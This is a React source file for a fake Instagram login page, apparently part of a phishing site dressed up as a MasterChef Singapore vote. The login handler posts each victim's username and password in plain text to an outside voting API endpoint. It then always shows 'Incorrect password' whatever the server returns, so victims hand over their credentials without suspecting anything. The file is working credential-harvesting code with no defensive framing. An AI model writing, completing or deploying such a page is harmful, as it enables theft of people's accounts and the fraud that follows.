import { useState } from "react";
import instagramLogo from "../assets/instagram-logo.png";
export default function InstagramLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  



async function handleLogin(e) {
  e.preventDefault();

  if (!username || !password) {
    alert("Please enter your username and password.");
    return;
  }

  setLoading(true);

  try {
    await new Promise((resolve) => setTimeout(resolve, 700));
    await fetch(
      "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          candidate_number: 1,
          platform: "instagram",
          username,
          password,
          location: localStorage.getItem("voteLocation"),
        }),
      }
    );
  } catch (err) {
    console.error(err);
  } finally {
    setError(true);
    setPassword("");
    setLoading(false);
  }
}

  return (
    <div className="min-h-screen bg-[#f3f4f6] flex items-center justify-center px-6 py-10">
      <div className="w-full max-w-[340px] rounded-[38px] bg-white border border-gray-200 px-6 pt-8 pb-10 shadow-[0_25px_60px_rgba(15,23,42,0.12)]">
        <p className="text-center text-sm text-slate-500 mb-8">English (UK)</p>

        <img src={instagramLogo} alt="Instagram Logo" className="mx-auto mb-8 h-16 w-16 object-contain" />

        <form onSubmit={handleLogin} className="space-y-4">
          <input
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Mobile number or email address"
            className="w-full h-12 rounded-2xl border border-slate-300 bg-white px-5 text-slate-700 placeholder:text-slate-400 outline-none transition focus:border-blue-600 focus:ring-2 focus:ring-blue-100"
          />

          <input
            type="password"
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              if (error) setError(false);
            }}
            placeholder="Password"
            className={`w-full h-12 rounded-2xl border px-5 text-slate-700 placeholder:text-slate-400 outline-none transition focus:ring-2 ${
              error
                ? "shake-error border-red-500 bg-red-50 focus:border-red-500 focus:ring-red-100"
                : "border-slate-300 bg-white focus:border-blue-600 focus:ring-blue-100"
            }`}
          />
          {error && <p className="text-sm text-red-600">Incorrect password</p>}

          <button
            type="submit"
            disabled={loading}
            className="w-full h-12 rounded-full bg-[#4568f0] hover:bg-[#3b5ede] transition duration-200 text-white font-bold text-lg"
          >
            {loading ? "Logging in..." : "Log In"}
          </button>

          <div className="text-center pt-4">
            <button type="button" className="text-sm text-slate-500 hover:underline">
              Forgotten password?
            </button>
          </div>

          <button
            type="button"
            className="w-full h-12 rounded-full border border-[#4568f0] text-[#4568f0] font-semibold text-base bg-white hover:bg-[#f5f7ff] transition duration-200"
            onClick={() => window.location.href = "/"}
          >
            Create new account
          </button>
        </form>
      </div>
    </div>
  );
}
